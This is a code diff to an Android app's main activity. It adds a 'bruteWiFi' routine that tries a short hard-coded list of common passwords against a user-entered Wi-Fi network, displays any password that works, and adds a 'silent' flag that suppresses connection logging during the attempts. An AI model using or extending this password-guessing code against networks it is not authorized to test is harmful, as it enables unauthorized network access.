@@ -37,7 +37,20 @@ public class MainActivity extends AppCompatActivity {
     public void bruteWiFi(View view)
     {
         WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        TextView errorView = (TextView) findViewById(R.id.errorV);
+        EditText ssidEdit = (EditText) findViewById(R.id.ssid);
         wifi.setWifiEnabled(true);
+
+        String ssid = ssidEdit.getText().toString();
+        String passList[] = {"87654321","00000000","12345678"};
+        for(String i : passList){
+            if(connectToUnknown(wifi, ssid, i, true)){
+                errorView.append("ssid: " + ssid + "\r\n");
+                errorView.append("Pass: " + i + "\r\n");
+
+                break;
+            }
+        }
     }
 
     public void connect(View view) throws InterruptedException {
@@ -49,9 +62,9 @@ public class MainActivity extends AppCompatActivity {
 
         String ssid = ssidEdit.getText().toString();
         String pass = passEdit.getText().toString();
-        boolean knownConnectionSuccess = connectToKnownWiFi(wifi, ssid);
+        boolean knownConnectionSuccess = connectToKnownWiFi(wifi, ssid, false);
         if( !knownConnectionSuccess ) {
-            boolean isSuccess = connectToUnknown(wifi, ssid, pass);
+            boolean isSuccess = connectToUnknown(wifi, ssid, pass, false);
             if( !isSuccess ){
                 errorView.append("Error while connecting\r\n");
             }else if(isSuccess){
@@ -74,7 +87,7 @@ public class MainActivity extends AppCompatActivity {
     @param wifi
     @param ssid
      */
-    boolean connectToKnownWiFi(WifiManager wifi, String ssid)
+    boolean connectToKnownWiFi(WifiManager wifi, String ssid, boolean silent)
     {
         TextView errorView = (TextView) findViewById(R.id.errorV);
         wifi.setWifiEnabled(true);
@@ -82,11 +95,14 @@ public class MainActivity extends AppCompatActivity {
         for(WifiConfiguration i : knownList){
             if(i.SSID  != null && i.SSID.equals("\""+ssid+"\"")){
                 wifi.disconnect();
-                errorView.append("Connecting to " + ("\"" + ssid + "\"\r\n") );
+                if(!silent)
+                    errorView.append("Connecting to " + ("\"" + ssid + "\"\r\n") );
                 boolean rs = wifi.enableNetwork(i.networkId, true);
-                errorView.append("Enable network returned:" + rs + "\r\n");
+                if(!silent)
+                    errorView.append("Enable network returned:" + rs + "\r\n");
                 rs = wifi.reconnect();
-                errorView.append("Reconnect returned:" + rs + "\r\n");
+                if(!silent)
+                    errorView.append("Reconnect returned:" + rs + "\r\n");
                 return true;
             }
         }
@@ -99,7 +115,7 @@ public class MainActivity extends AppCompatActivity {
     @param ssid
     @param pass
      */
-    boolean connectToUnknown(WifiManager wifi, String ssid, String pass)
+    boolean connectToUnknown(WifiManager wifi, String ssid, String pass, boolean silent)
     {
         TextView errorView = (TextView) findViewById(R.id.errorV);
         wifi.setWifiEnabled(true);
@@ -115,7 +131,8 @@ public class MainActivity extends AppCompatActivity {
         wifiConf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
         wifiConf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
         int res = wifi.addNetwork(wifiConf);
-        errorView.append("add Network returned " + res +"\r\n");
+        if(!silent)
+            errorView.append("add Network returned " + res +"\r\n");
         //boolean b = wifi.enableNetwork(res, true);
         //errorView.append("enableNetwork returned " + b + "\r\n");
         //wifiConf.hiddenSSID = true;
@@ -149,7 +166,7 @@ public class MainActivity extends AppCompatActivity {
         //int res = wifi.addNetwork(wifiConf);
         //wifi.enableNetwork(res, true);
 
-        if(connectToKnownWiFi(wifi, ssid)) {
+        if(connectToKnownWiFi(wifi, ssid, false)) {
             return true;
         }else{
             return false;
